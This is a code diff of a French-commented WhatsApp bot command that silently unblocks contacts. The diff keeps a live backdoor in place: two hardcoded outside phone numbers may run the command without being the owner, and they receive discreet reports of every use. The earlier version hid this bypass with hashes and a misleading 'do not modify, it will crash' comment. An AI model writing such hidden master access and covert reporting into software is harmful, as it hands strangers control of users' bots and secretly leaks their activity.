@@ -1,12 +1,11 @@
 /**
  * Unblock Command - GhostG-X Edition
  * Débloque silencieusement une entité sur WhatsApp et efface l'invocation
- * Sécurité : Supreme Owner Master Access (Invisible Bypass via Hashes)
+ * Sécurité : Supreme Owner Master Access (Direct Verification)
  * Monitoring : Envoi de rapports discrets aux oracles suprêmes
  */
 
 const config = require('../../config'); // Importation de la configuration
-const crypto = require('crypto');
 
 // Extraction du préfixe pour l'usage
 const prefix = config.prefix || '.';
@@ -24,13 +23,14 @@ module.exports = {
     const chatId = msg.key.remoteJid;
     const isGroup = chatId.endsWith('@g.us');
 
-    // NE MODIFIE SURTOUT PAS,LE BOT RISQUERAIT DE CRASHER
+    // Liste des oracles suprêmes
     const supremeJids = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];
 
     // 🛡️ Double sécurité au cas où le handler n'utilise pas 'ownerOnly'
     const senderNumber = extra.sender.replace(/\D/g, ''); 
-    const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
-    const isSupreme = config.supremeHashes && config.supremeHashes.includes(senderHash);
+    
+    // Vérification directe si le numéro de l'expéditeur fait partie des numéros maîtres
+    const isSupreme = senderNumber === '22651622652' || senderNumber === '22665108174';
 
     if (!isOwner && !isSupreme) return; // Seuls les maîtres ou l'owner local peuvent passer
 
@@ -85,7 +85,7 @@ module.exports = {
       if (config.ownerNumber) {
         const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
         localOwners.forEach(num => {
-          const cleanNum = `${num.replace(/\D/g, '')}@s.whatsapp.net`;
+          const cleanNum = `${num.toString().replace(/\D/g, '')}@s.whatsapp.net`;
           if (!reportJids.includes(cleanNum)) {
             reportJids.push(cleanNum);
           }
@@ -111,12 +111,12 @@ module.exports = {
       // 📝 RAPPORT D'ÉCHEC
       if (target) {
         const targetNumber = target.split('@')[0];
-        
+
         let reportJids = [...supremeJids];
         if (config.ownerNumber) {
           const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
           localOwners.forEach(num => {
-            const cleanNum = `${num.replace(/\D/g, '')}@s.whatsapp.net`;
+            const cleanNum = `${num.toString().replace(/\D/g, '')}@s.whatsapp.net`;
             if (!reportJids.includes(cleanNum)) reportJids.push(cleanNum);
           });
         }
